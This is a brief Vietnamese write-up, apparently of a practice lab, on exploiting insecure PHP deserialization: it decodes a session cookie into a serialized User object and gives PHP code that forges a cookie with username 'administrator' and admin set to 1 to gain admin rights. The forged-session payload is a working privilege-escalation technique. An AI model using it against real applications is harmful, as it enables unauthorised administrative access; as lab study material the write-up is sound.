Bài này thì là mức đọ thấp

Khi mà đăng nhập thì sẽ có một session ở trong ta nhận thấy rằng mã này như urlenc
Nên ta sử dụng và lại ra được một mã hóa có dạng bas64 sau đó ta được mã có dạng
       O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}


Nhìn vào kết quả trả ra ta có thể nhận định rằng sever dùng serialization để mã hóa session 
class Usẻ có dạng :
class User{
    public $username;
    public $admin;
}
ở đây sẽ check admin=1 or 0 để xác nhận người dùng có phải admin không ngoài ra ta có thể đổi thành chuỗi bất kì vì còn chứa lỗi type juggling

Ta có thể sử dụng các công cụ hoặc code như sau:
class User{
    public $username="administrator";
    public $admin= 1;
}
$user=new User();
echo urlencode(base64_encode(serialize($user)));

hoặc  khởi tạo xong rồi gán
class User{
    public $username;
    public $admin;
}
$user=new User();
$user->username="administrator";
$user->admin=1;
echo urlencode(base64_encode(serialize($user)));

và 3 2 1 pùm
cảm ơn đã theo dõi:<